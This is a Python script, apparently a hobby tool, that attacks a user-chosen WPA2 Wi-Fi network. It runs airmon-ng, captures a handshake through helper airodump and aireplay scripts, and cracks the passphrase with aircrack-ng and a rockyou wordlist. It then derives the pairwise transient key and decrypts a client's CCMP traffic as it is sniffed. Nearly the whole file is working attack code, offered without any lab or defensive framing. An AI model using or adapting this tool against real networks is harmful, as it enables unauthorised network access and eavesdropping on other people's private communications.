import sys
import os
import os.path

from scapy.all import *
from binascii import *
import subprocess as sub

import WPA2
import Handshake
import Decrypt_CCMP

class sniffer():
    def __init__(self):
        self.dfilepath = str(sub.run("pwd", capture_output=True).stdout)[2:-3]

        start = input("First time starting up? [Y/N]:")

        if start == "Y" or start == "y":
            # put everything in monitor mode when starting up
            print("Killing services")
            os.system("sudo airmon-ng check kill")
            print("Starting wlan1mon")
            os.system("sudo airmon-ng start wlan1 1")
            print("Done")

        print("Which wifi do you want to crack")

        self.wifi = input("Wifi name: ")
        self.find_mac()

        print("Starting to sniff")
        self.sniff_packets()

    def find_mac(self):
        print("Finding Mac-Adress")

        os.system("sudo iwlist wlan0 scan|grep -A 10 -B 10 {} >".format(self.wifi) + self.dfilepath + "/output.txt")

        wifi_list = open(self.dfilepath + "/output.txt", 'r').read()
        index = wifi_list.index("Address")

        self.mac = wifi_list[index + len("Address: "):index + len("Address: ") + 17]
        self.get_master_key()

    def get_master_key(self):
        if not os.path.isfile(self.dfilepath + "/WPA_{}-01.cap".format(self.mac)):
            self.make_cap()

        print("Cracking the key")

        os.system("sudo aircrack-ng " + self.dfilepath + "/WPA_{}-01.cap -w ".format(self.mac) + self.dfilepath + "/rockyou_simple.txt>" + self.dfilepath + "/key_info.txt")
        key_file = open(self.dfilepath + "/key_info.txt", "r").read()
        index = key_file.index("KEY FOUND!") + len('KEY FOUND! [ ')
        self.master_key = ""
        
        while key_file[index] != ' ':
            self.master_key += key_file[index]
            index += 1

        print("Key has been found: {}".format(self.master_key))
        print("Finding transient key")

        self.get_transient_key()

    def condense_mac(self, mac):
        condensed_mac = ""

        for i in range(len(mac)):
            if ((i+1) % 3) != 0:
                condensed_mac += mac[i]

        return condensed_mac

    def get_transient_key(self):
        password = self.master_key
        ssid = self.wifi
        capfile = rdpcap(self.dfilepath + "/WPA_{}-01.cap".format(self.mac))
        handshakes = []

        for i in capfile:
            if i.haslayer(EAPOL):
                handshakes.append(i)

        anonce, snonce, client_mac = Handshake.find_as_nonce(handshakes)
        anonce = a2b_hex(anonce)
        snonce = a2b_hex(snonce)
        self.mac_cl = client_mac

        mac_ap = a2b_hex(self.condense_mac(self.mac.lower()))
        mac_cl_bin = a2b_hex(self.condense_mac(self.mac_cl))

        PKE = b'Pairwise key expansion'  # Standard Set Value
        PMK = Handshake.pmk_generation(password, ssid)
        key_data = min(mac_ap, mac_cl_bin) + max(mac_ap, mac_cl_bin) + min(anonce, snonce) + max(anonce, snonce)
        PTK = Handshake.ptk_generation(PMK, PKE, key_data)

        self.transient_key = WPA2.key_to_matrix(PTK)

        nb = len(self.master_key)

        self.rounds = 10

        if nb == 24:
            self.rounds = 12
        elif nb == 32:
            self.rounds = 14

        self.round_keys = WPA2.make_key_streams(self.transient_key, self.rounds)

    def filtersniff(self, packet):
        if packet is None:
            pass
        elif packet.haslayer(Dot11CCMP):
            if (packet.addr1 == self.mac_cl) or (packet.addr2 == self.mac_cl):
                return packet

    def sniff_packets(self):
        sniff(iface = "wlan1mon", lfilter = self.filtersniff, prn = lambda x : Decrypt_CCMP.decrypt(x, self.round_keys, self.rounds))

    def make_cap(self):
        process2 = sub.Popen(["xterm", "-e", "sudo python3 " + self.dfilepath + "/AirodumpWPA2.py {} {}".format(self.mac, self.dfilepath)])
        process1 = sub.Popen(["xterm", "-e", "sudo python3 " + self.dfilepath + "/AireplayWPA2.py {}".format(self.mac)])
        process1.wait()
        process2.wait()

sniffer()
